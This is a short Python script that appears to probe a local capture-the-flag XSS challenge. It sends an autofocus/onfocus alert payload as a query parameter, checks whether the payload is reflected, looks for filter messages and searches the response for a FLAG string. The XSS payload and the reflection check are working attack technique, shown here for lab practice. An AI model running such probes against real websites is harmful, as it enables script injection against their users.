import requests,urllib.parse

url="http://127.0.0.1:33139/xss25"

# Test a simple payload first
test_payload = "<input autofocus onfocus=alert(String.fromCharCode(88,83,83))>"

print("Testing connection and payload reflection...")
print(f"URL: {url}")
print(f"Payload: {test_payload}")

try:
    r = requests.get(url, params={"input": test_payload}, timeout=10)
    print(f"\nStatus: {r.status_code}")
    print(f"Length: {len(r.text)}B")
    
    # Check if payload is reflected
    if test_payload in r.text:
        print("\n[REFLECTED] Payload found in response!")
        # Show snippet around payload
        idx = r.text.find(test_payload)
        snippet = r.text[max(0, idx-100):min(len(r.text), idx+len(test_payload)+100)]
        print(f"\nSnippet:\n{snippet}")
    else:
        print("\n[NOT REFLECTED] Payload not found in response")
        
    # Check for filters
    if "filter" in r.text.lower():
        print("\n[BLOCKED] Filter detected in response:")
        lines = [line for line in r.text.split('\n') if 'filter' in line.lower()][:5]
        for line in lines:
            print(f"  {line.strip()}")
    
    # Search for FLAG
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', r.text)
    if flags:
        print(f"\n[FLAG FOUND] {flags}")
    else:
        print("\nNo FLAG found in this test")
        
except Exception as e:
    print(f"\nError: {e}")
